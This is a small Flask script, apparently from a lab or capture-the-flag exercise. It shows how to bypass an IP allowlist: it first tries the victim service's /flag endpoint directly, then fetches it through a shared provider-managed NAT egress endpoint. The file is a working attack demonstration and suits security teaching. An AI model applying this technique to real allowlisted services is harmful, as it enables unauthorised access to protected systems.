"""Reach an allowlisted victim service through shared provider-managed NAT."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
NAT = os.environ.get("NAT_URL", "http://shared-nat:5000")
VICTIM = os.environ.get("VICTIM_URL", "http://victim-api:5000")

HTML = """<h1>Shared NAT Egress Bypass</h1>
<form method="post" action="/run"><button>Run</button></form>
<pre>{{out}}</pre>"""


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


@app.route("/run", methods=["POST"])
def run():
    log = []
    try:
        direct = requests.get(f"{VICTIM}/flag", timeout=8)
        log.append(f"[direct] {direct.status_code}: {direct.text}")
    except Exception as e:
        log.append(f"[direct] unreachable: {e}")
    r = requests.post(f"{NAT}/egress", json={"url": f"{VICTIM}/flag"}, timeout=10)
    log.append(f"[via shared NAT] {r.text}")
    return HTML.replace("{{out}}", "\n".join(log))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
